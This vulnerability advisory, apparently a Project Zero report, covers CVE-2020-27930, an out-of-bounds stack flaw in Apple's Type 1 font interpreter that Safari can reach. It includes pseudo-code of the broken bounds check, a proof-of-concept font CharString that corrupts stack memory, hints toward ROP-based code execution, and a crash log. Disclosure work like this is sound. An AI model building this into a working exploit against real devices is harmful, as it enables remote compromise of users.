@@ -1,0 +1,115 @@
+Apple Safari RCE via undefined othersubr in Type 1 fonts handled by libType1Scaler.dylib (macOS/iOS)
+
+NOTE: We have evidence that the following bug is being used in the wild. Therefore, this bug is subject to a 7 day disclosure deadline.
+
+Apple macOS and iOS ship with a libType1Scaler.dylib system library, which implements an interpreter for the legacy Type 1 PostScript font format [1]. The library can be reached with user-controlled data via the Apple Safari web browser with a website that embeds a custom Type 1 font, making it a remotely accessible 1-click attack surface. The specific function that acts as the interpreter for glyph outline programs is libType1Scaler.dylib`DoType1InterpretCharString, and it is where most of the CharString-related logic is found.
+
+One of the instructions supported by the routine is 'callothersubr' (opcode 12 16), which expects the following syntax:
+
+---
+arg_1 . . . arg_n n othersubr# callothersubr
+----
+
+According to the specification, the instruction is supposed to call into a custom font-defined PostScript procedure identified by the othersubr# index and pass `n` arguments (arg_1, ..., arg_n) to it. In practice, there is a set of othersubrs that have predefined meaning and are implemented by the interpreter natively (e.g. 0-4, 6, 12, 13, ..., 30) and for all others, the library silently ignores them by removing `n` values from the operand stack and continuing execution. However, there is a serious security vulnerability caused by the incorrect handling of negative values of `n`.
+
+Assuming that the Type 1 operand stack and the pointer to the current top item are declared on the stack frame of DoType1InterpretCharString():
+
+--- cut ---
+int op_stk[64];
+int *op_sp; // should be always between &op_stk[0] and &op_stk[63]
+--- cut ---
+
+the generic handler for non-standard othersubrs executes the pseudo-code shown below:
+
+--- cut ---
+int n = POP(); // user-controlled
+
+op_sp -= n;
+if (op_sp < &op_stk[0]) {
+  // bail out;
+}
+--- cut ---
+
+The new stack pointer is properly sanitized against the bottom of the stack (which is important for positive `n`), but the interpreter fails to verify that op_sp doesn't go beyond &op_stk[63] for a negative `n`. Once the op_sp pointer goes out of bounds, the Type 1 program gets access to the native stack frame of the current function and its callers, including return addresses, various pointers to data, code, etc. Coupled with the ability to execute conditional logic and arithmetic operations, it is straightforward from this point to construct an arbitrary read/write primitive, build a ROP chain directly on the stack, or execute arbitrary code by other means.
+
+A proof-of-concept exploit is provided with this report. We have confirmed the bug on the latest versions of iOS (14.1) and macOS (10.15.7). The sample font file contains a single CharString for the letter 'A', which has the following structure:
+
+--- cut ---
+/CharStrings 1 begin
+/A ## -| {
+  -1024 100 callother not setcurrentpoint
+  -2048 100 callother not setcurrentpoint
+  -3072 100 callother not setcurrentpoint
+  ...
+  -29696 100 callother not setcurrentpoint
+  -30720 100 callother not setcurrentpoint
+  endchar
+} |-
+--- cut ---
+
+At the beginning of each line, the program moves the operand stack pointer out-of-bounds by an increasing multiple of 1024 dwords (4096 bytes) with the callother vulnerability, then performs a `not` operation to corrupt memory at that address, and restores the pointer back to the bottom of the legitimate PostScript stack with `setcurrentpoint`. At some point during the execution of the CharString, it is expected that the invalid stack pointer will exceed the upper boundary of the native thread stack and point to unmapped memory, leading to an observable SIGSEGV crash in the `not` instruction handler. An example crash report from Safari on macOS may look as follows:
+
+--- cut ---
+Process:               com.apple.WebKit.WebContent [46236]
+Path:                  /Library/Apple/*/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent
+Identifier:            com.apple.WebKit.WebContent
+Version:               15610 (15610.1.28.1.9)
+Build Info:            WebKit2-7610001028001009~3 (610A55)
+Code Type:             X86-64 (Native)
+Parent Process:        ??? [1]
+Responsible:           Safari [13267]
+User ID:               150885
+
+[...]
+
+Crashed Thread:        6  Dispatch queue: CA::CG::Queue
+
+Exception Type:        EXC_BAD_ACCESS (SIGBUS)
+Exception Codes:       KERN_PROTECTION_FAILURE at 0x00007000067c2afc
+Exception Note:        EXC_CORPSE_NOTIFY
+
+Termination Signal:    Bus error: 10
+Termination Reason:    Namespace SIGNAL, Code 0xa
+Terminating Process:   exc handler [46236]
+
+[...]
+
+Thread 6 Crashed:: Dispatch queue: CA::CG::Queue
+0   libType1Scaler.dylib            0x00007fff4bd2c3c9 DoType1InterpretCharString(_t_FontInst*, _t_BCProcs*, _t_T1CharDataDesc*, _t_CharIO*, _t_RunRec*, _t_PathProcs*, T1Args*) + 5561
+1   libType1Scaler.dylib            0x00007fff4bd2ade0 Type1InterpretCharString(_t_FontInst*, _t_BCProcs*, _t_T1CharDataDesc*, _t_CharIO*, _t_RunRec*, _t_PathProcs*, T1Args*) + 563
+2   libType1Scaler.dylib            0x00007fff4bd47377 BuildRuns(_t_FontInst*, void*, _t_CharIO*, _t_DevBBoxRec*, _t_RunRec*, _t_BCProcs*, void*, unsigned int) + 504
+3   libType1Scaler.dylib            0x00007fff4bd466eb ATMBuildRuns(_t_FontInst*, _t_BCProcs*, void*, _t_CharIO*, _t_DevBBoxRec*, _t_RunRec*, void*) + 50
+4   libType1Scaler.dylib            0x00007fff4bd610a2 TGlyphRenderingContext::RenderRuns(_t_FontInst const&, bool) + 334
+5   libType1Scaler.dylib            0x00007fff4bd625a4 TType1PSFont::RenderGlyphBitMapAndMetricss(TType1Transform const&, _t_FontInst const&, unsigned short, unsigned char const*, unsigned short, GlyphRenderingMetrics*, unsigned int, void*, unsigned int&) const + 324
+6   libType1Scaler.dylib            0x00007fff4bd6241b TType1PSFont::GetGlyphBitMap(TType1Transform const&, unsigned short, GlyphRenderingMetrics*, unsigned int, void*, unsigned int&) const + 181
+7   libType1Scaler.dylib            0x00007fff4bd347e3 TType1Strike::GetGlyphs(TRenderingDescription const&, unsigned int, unsigned short const*, TDestinationMapping const&, GlyphDataResults*) const + 413
+8   libType1Scaler.dylib            0x00007fff4bd3458f Type1RenderGlyphs(unsigned int, TStrikeDescription const*, TRenderingDescription const*, unsigned int, unsigned short const*, void*, unsigned int, GlyphDataResults*) + 128
+9   libFontParser.dylib             0x00007fff4bbdb139 TConcreteFontScaler::CopyGlyphBitmap(unsigned short, unsigned int, CGRect*, unsigned long*) const + 289
+10  libFontParser.dylib             0x00007fff4bbdaf86 FPFontCopyGlyphBitmap + 378
+11  com.apple.CoreGraphics          0x00007fff2faad2d7 create_glyph_bitmap + 97
+12  com.apple.CoreGraphics          0x00007fff2faaceee CGFontCreateGlyphBitmapWithDilation + 146
+13  com.apple.CoreGraphics          0x00007fff2faacde5 CGGlyphBuilder::create_missing_bitmaps(CGGlyphIdentifier const*, unsigned long, CGGlyphBitmap const**) + 121
+14  com.apple.CoreGraphics          0x00007fff2faac980 CGGlyphBuilder::lock_glyph_bitmaps(CGGlyphIdentifier const*, unsigned long, CGGlyphBitmap const**) + 214
+15  com.apple.QuartzCore            0x00007fff3b34b4ab CA::CG::draw_glyph_bitmaps(CA::CG::Renderer&, CA::CG::FillGlyphs const&, CA::CG::ShadowStyle const*) + 1099
+16  com.apple.QuartzCore            0x00007fff3b1a3af6 CA::CG::FillGlyphs::draw_shape_and_color(CA::CG::Renderer&) const + 26
+17  com.apple.QuartzCore            0x00007fff3b186991 CA::CG::DrawOp::render(CA::CG::Renderer&) const + 3373
+18  com.apple.QuartzCore            0x00007fff3b1824a7 CA::CG::Queue::render_callback(void*) + 381
+19  libdispatch.dylib               0x00007fff694dd658 _dispatch_client_callout + 8
+20  libdispatch.dylib               0x00007fff694e2d7e _dispatch_lane_serial_drain + 911
+21  libdispatch.dylib               0x00007fff694e35d6 _dispatch_lane_invoke + 363
+22  libdispatch.dylib               0x00007fff694ecc09 _dispatch_workloop_worker_thread + 596
+23  libsystem_pthread.dylib         0x00007fff69737a3d _pthread_wqthread + 290
+24  libsystem_pthread.dylib         0x00007fff69736b77 start_wqthread + 15
+--- cut ---
+
+References:
+[1] https://www.adobe.com/content/dam/acom/en/devnet/font/pdfs/T1_SPEC.pdf
+
+NOTE: We have evidence that the following bug is being used in the wild. Therefore, this bug is subject to a 7 day disclosure deadline.
+
+Related CVE Numbers: CVE-2020-27930,CVE-2020-27930
+
+
+
+Found by: mjurczyk@google.com
+
